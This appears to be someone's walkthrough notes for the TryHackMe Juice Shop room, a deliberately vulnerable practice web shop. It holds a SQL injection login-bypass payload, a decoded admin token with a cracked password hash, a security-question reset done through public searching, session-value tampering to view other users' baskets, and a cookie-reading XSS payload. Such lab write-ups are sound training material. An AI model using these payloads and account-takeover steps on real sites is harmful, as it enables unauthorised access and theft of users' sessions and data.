https://tryhackme.com/room/juiceshop

https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b

found this generic SQL injection payload that allows us to login as admin

```
' OR 1 -- -
```

check token after logging in as admin

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsImlzQWRtaW4iOnRydWUsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6ImRlZmF1bHQuc3ZnIiwiY3JlYXRlZEF0IjoiMjAyMC0wOC0wNSAxNTowNToyNi45MjUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0wOC0wNSAxNTowNToyNi45MjUgKzAwOjAwIn0sImlhdCI6MTU5NjY0MDE3OSwiZXhwIjoxNTk2NjU4MTc5fQ.qHspamVYbL3fnJtoOcdh0uJz4EQU9VZQUBaMkFYChSMJmTpR07WD1wgn9G3lxxiFjUgqUwZT0JQjF2XXQ78y25qsTDMmve_MGs9b3GNcHm3yp63YzEw8VI8GtxVvfiiexlbTzO5nvMRtNin0Nymgr-Qu5K0nueSX5FMSgmKG48U
```

JOSN Web Token Decode

```
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "isAdmin": true,
    "lastLoginIp": "0.0.0.0",
    "profileImage": "default.svg",
    "createdAt": "2020-08-05 15:05:26.925 +00:00",
    "updatedAt": "2020-08-05 15:05:26.925 +00:00"
  },
  "iat": 1596640179,
  "exp": 1596658179
}
```

crackstation - md5 hash

```
admin123
```

check forgotten password page with the same email format as admin 

```
jim@juice-sh.op
```

the security question to reset jim's password is his elder sibling's middle name

check web developer > Debugger > main.js > https://beautifier.io/

found administration path

go to /#/administration

user 2 is jim

check recycling requests which lists user 2's address 

```
Starfleet HQ, 24-593 Federation Drive, San Francisco, CA
```

google this address + Jim

find Jim is short for James

search for "James T. Kirk brother"

find the answer: Samuel

dirbuster or hoverover the terms and conditions to see the ftp directory

nagivate to the ftp directory and find the first file 

```
acquisitions.md
```

web developer > storage > session storage

find Key bid and value

change value and refresh page to see other user's basket

we can execute java script by inputing into search or tracking orders

the search function is vulnerable to xss, so is the track orders page

```
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```
